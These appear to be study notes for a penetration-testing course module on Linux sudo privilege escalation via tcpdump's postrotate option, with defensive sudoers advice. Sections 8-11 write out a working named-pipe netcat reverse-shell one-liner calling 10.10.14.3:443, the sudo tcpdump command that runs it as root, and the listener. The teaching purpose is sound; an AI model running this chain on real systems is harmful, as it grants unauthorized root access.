# 1. 🧠 What is `sudo`?

`sudo` allows an account to run certain commands **in the context of another account**, commonly `root`, without actually changing users.

The permissions are controlled through:

```text
/etc/sudoers
```

Conceptually:

```text
Normal User
     │
     │ sudo command
     ▼
 /etc/sudoers
     │
     ▼
"Is this user allowed?"
     │
   ┌─┴─┐
   │   │
  YES  NO
   │   │
   ▼   ▼
Execute  Denied
as allowed
user
```

---

# 2. 🔎 First Command After Getting a Shell

The module emphasizes that when landing on a system, you should **always check the current user's sudo privileges**.

### ⭐ MUST MEMORIZE:

```bash
sudo -l
```

This lists the commands the current user is allowed to execute with `sudo`.

---

# 3. 📋 Understanding `sudo -l`

Example:

```text
User sysadm may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/tcpdump
```

Break this down:

```text
(root)
   │
   └── Command can run as root

NOPASSWD
   │
   └── Password isn't required for this sudo rule

/usr/sbin/tcpdump
   │
   └── Specific permitted binary
```

So effectively:

```text
sysadm
  │
  └── sudo /usr/sbin/tcpdump
              │
              ▼
            root
```

---

# 4. 🔥 Why `NOPASSWD` Matters

Normally, `sudo` may ask the user for their password.

But:

```text
NOPASSWD
```

means the specified sudo command can be executed **without entering a password**.

The module specifically notes that `NOPASSWD` entries can sometimes be seen without entering a password when listing sudo rights.

### Example

```text
(root) NOPASSWD: /usr/sbin/tcpdump
```

This is immediately worth investigating.

⚠️ **Important:** `NOPASSWD` itself isn't a vulnerability. The important question is **what the permitted command can do**.

---

# 5. 🚨 Sudo Misconfiguration

The module highlights two major ways sudo can be misconfigured.

### Problem 1 — Excessive privileges

For example:

```text
User → full root privileges
```

without requiring a password.

That's far more privilege than many users actually need.

---

### Problem 2 — Too-loose command restrictions

A user might be permitted to run a program as root, but that program may have options allowing additional commands or scripts to execute.

This creates:

```text
Allowed binary
     │
     ▼
Dangerous feature
     │
     ▼
Command execution
     │
     ▼
Root
```

---

# 6. 🧪 Module Example: `tcpdump`

The module uses:

```text
/usr/sbin/tcpdump
```

Suppose `/etc/sudoers` contains:

```text
(ALL) NOPASSWD: /usr/sbin/tcpdump
```

The important question becomes:

> **What can `tcpdump` do when executed as root?**

The module checks its man page:

```bash
man tcpdump
```

---

# 7. 💣 `tcpdump` `-z` Option

The important functionality is:

```text
-z postrotate-command
```

The module explains that when used with `-C` or `-G`, `tcpdump` can run the specified **postrotate-command** after a savefile rotation.

For example:

```text
-z gzip
```

could cause the rotated savefile to be processed with `gzip`.

The security significance is:

```text
tcpdump
   │
   ▼
-z postrotate-command
   │
   ▼
Execute another program
```

If `tcpdump` itself is being run with elevated privileges, this functionality needs careful investigation.

---

# 8. 🔥 The Attack Chain

The module demonstrates a script:

```text
/tmp/.test
```

containing a reverse-shell command.

Then `tcpdump` is invoked through `sudo` with:

```bash
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

The important pieces are:

```text
sudo
 │
 ▼
tcpdump
 │
 ├── -G 1
 │      │
 │      └── Trigger file rotation
 │
 ├── -W 1
 │      │
 │      └── Limit number of savefiles
 │
 ├── -z /tmp/.test
 │      │
 │      └── Post-rotation command
 │
 └── -Z root
        │
        └── Run with root privileges
```

---

# 9. 🧩 Understanding the Command

The module's command is:

```bash
sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

Let's identify the important options:

|Option|Role in the module|
|---|---|
|`sudo`|Execute with elevated privileges|
|`/usr/sbin/tcpdump`|Absolute path to `tcpdump`|
|`-i ens192`|Capture on interface `ens192`|
|`-w /dev/null`|Write capture output to `/dev/null`|
|`-W 1`|File limit|
|`-G 1`|Rotate based on time|
|`-z /tmp/.test`|Post-rotation command|
|`-Z root`|Drop privileges to root|

The exact interaction of these options is what makes the module's demonstration work.

---

# 10. 📜 The Script

The module creates:

```text
/tmp/.test
```

with:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f
```

This is a **named-pipe (`mkfifo`) reverse-shell one-liner**.

Conceptually:

```text
Target machine
      │
      │ executes .test
      ▼
   /bin/sh
      │
      │ network connection
      ▼
Attacking machine
      │
      ▼
   Netcat listener
      │
      ▼
 Root shell
```

---

# 11. 🎧 Listener

The module starts:

```bash
nc -lnvp 443
```

The listener waits for the target to connect.

The resulting shell shows:

```text
root@NIX02:~# id && hostname
uid=0(root) gid=0(root) groups=0(root)
NIX02
```

The important confirmation is:

```text
uid=0(root)
```

### ⭐ `uid=0` = root

So the complete demonstration is:

```text
sudo permission
      │
      ▼
tcpdump as root
      │
      ▼
tcpdump postrotate functionality
      │
      ▼
Execute /tmp/.test
      │
      ▼
Reverse shell
      │
      ▼
uid=0(root)
```

---

# 12. ⚠️ Modern Defenses: AppArmor

The module gives an important caveat:

> **AppArmor in more recent distributions has predefined the commands used with the `postrotate-command`, effectively preventing command execution.**

This is an important lesson.

Don't assume:

```text
GTFOBins technique
      =
Guaranteed exploitation
```

Instead:

```text
Technique identified
       │
       ▼
Check target version/configuration
       │
       ▼
Security controls?
       │
       ├── AppArmor
       ├── SELinux
       └── Other restrictions
       │
       ▼
Determine whether technique actually works
```

This is exactly the kind of thinking you need in CPTS.

---

# 13. 🛡️ Sudo Best Practice #1 — Absolute Paths

The module gives a very important defensive rule:

> **Always specify the absolute path to binaries listed in the `sudoers` file.**

Bad:

```text
cat
```

Better:

```text
/bin/cat
```

### Why?

This connects directly to the **PATH Abuse** topic you just studied.

Suppose sudoers contains:

```text
(ALL) NOPASSWD: cat
```

and the system resolves `cat` using `$PATH`.

If an attacker can influence the PATH or command resolution, they may potentially cause a malicious executable to be used.

Instead:

```text
(ALL) NOPASSWD: /bin/cat
```

explicitly identifies the intended binary.

### Connection:

```text
Sudo Rights
     │
     ▼
Command specified as:
     │
     ├── cat          ← potentially PATH-sensitive
     │
     └── /bin/cat     ← explicit binary
```

🔥 **This is why your previous PATH Abuse module matters here.**

---

# 14. 🛡️ Sudo Best Practice #2 — Least Privilege

The second recommendation is:

> **Grant `sudo` rights sparingly and based on the principle of least privilege.**

Ask:

```text
Does this user need full sudo?
       │
       ├── NO → Don't grant it
       │
       └── YES → Why?
```

Instead of:

```text
User → ALL commands as root
```

provide only what is required:

```text
User
 │
 ├── /bin/specific-command
 │
 └── /usr/bin/another-required-command
```

### Principle of Least Privilege

> Give a user **only the privileges necessary to perform their job**.

---

# 15. 🧠 The CPTS Methodology

When you run:

```bash
sudo -l
```

don't just look for:

```text
NOPASSWD
```

Look at **exactly what you're allowed to run**.

For example:

```text
(root) NOPASSWD: /usr/bin/vim
(root) NOPASSWD: /usr/bin/find
(root) NOPASSWD: /usr/bin/awk
(root) NOPASSWD: /usr/sbin/tcpdump
```

Then ask:

```text
        sudo -l
           │
           ▼
   What binary is allowed?
           │
           ▼
    Can it execute commands?
           │
           ▼
   Can it read/write files?
           │
           ▼
   Can it spawn another shell?
           │
           ▼
     Check GTFOBins
           │
           ▼
   Verify target-specific behavior
```

---

# 16. 🔥 Sudo + GTFOBins

This is where your previous **Special Permissions** module connects.

```text
             Privilege Escalation
                    │
       ┌────────────┴────────────┐
       ▼                         ▼
    SUID/SGID                 SUDO
       │                         │
       ▼                         ▼
   Find binary              sudo -l
       │                         │
       └────────────┬────────────┘
                    ▼
              Identify binary
                    │
                    ▼
                 GTFOBins
                    │
                    ▼
            Check functionality
                    │
                    ▼
           Potential privilege
                escalation
```

### ⭐ Important distinction

With SUID:

```text
Binary itself has elevated permission.
```

With sudo:

```text
Your account is explicitly authorized
to execute a specific command with
elevated privileges.
```

---

# 17. 🚨 What Makes a Sudo Entry Interesting?

A sudo rule becomes especially interesting when:

```text
Allowed as root
      +
NOPASSWD
      +
Program has command-execution functionality
      =
🔥 Potential privilege escalation
```

But also investigate:

```text
Allowed program
      │
      ├── Can read arbitrary files?
      ├── Can write arbitrary files?
      ├── Can execute commands?
      ├── Can invoke another interpreter?
      ├── Can load plugins?
      ├── Can execute scripts?
      └── Can manipulate environment?
```

---

# 18. 🧪 HTB Workflow

When you land on a Linux machine:

### Step 1

```bash
sudo -l
```

### Step 2

Record every permitted command.

### Step 3

Look at:

```text
User
Command
Run-as user
NOPASSWD
Arguments/restrictions
```

### Step 4

Investigate the binary.

```bash
which <command>
```

and/or use the absolute path provided by `sudo -l`.

### Step 5

Check the program's functionality.

```bash
man <command>
```

### Step 6

Check GTFOBins for known abuse cases.

### Step 7

**Verify whether the technique applies to this exact target.**

Look for defenses such as:

```text
AppArmor
SELinux
Version differences
Restricted arguments
Environment restrictions
```

---

# 🧠 STRICT MENTOR — Don't Make This Mistake

If you see:

```text
(root) NOPASSWD: /usr/sbin/tcpdump
```

don't immediately say:

> "I have root."

❌ Wrong.

You have:

> **An elevated execution opportunity that may or may not be exploitable.**

The correct thought process is:

```text
I can run tcpdump as root
          ↓
What can tcpdump do?
          ↓
Does it have command execution functionality?
          ↓
Is that functionality usable under this configuration?
          ↓
Are there security controls?
          ↓
Can I actually obtain elevated execution?
```

That distinction is **very important for professional pentesting/report writing**.

---

# 📌 MUST-MEMORIZE COMMANDS

### Check sudo rights

```bash
sudo -l
```

### Read command documentation

```bash
man tcpdump
```

### Module's example

```bash
sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

### Listener used in the example

```bash
nc -lnvp 443
```

---

# 🔥 FINAL REVISION CARD

```text
                    SUDO RIGHTS
                        │
                        ▼
                     sudo -l
                        │
                        ▼
              What can I execute?
                        │
                        ▼
                 As which user?
                        │
                        ▼
                      root?
                        │
                        ▼
             Is NOPASSWD present?
                        │
                        ▼
             What can the binary do?
                        │
              ┌─────────┼─────────┐
              ▼         ▼         ▼
           Execute     Read      Write
           commands    files     files
              │
              ▼
           GTFOBins
              │
              ▼
       Verify configuration
              │
              ▼
       Potential privilege
           escalation
```

### 🧠 The three rules to burn in:

**1. Always run:**

```bash
sudo -l
```

**2. Never assume `NOPASSWD` alone means vulnerability.**  
Investigate what the permitted binary can actually do.

**3. Connect sudo with your previous modules:**

```text
Sudo Rights
    ↕
PATH Abuse
    ↕
Special Permissions
    ↕
GTFOBins
    ↕
Privilege Escalation
```

This is exactly how your Linux privesc knowledge should start forming into **one methodology rather than separate tricks**.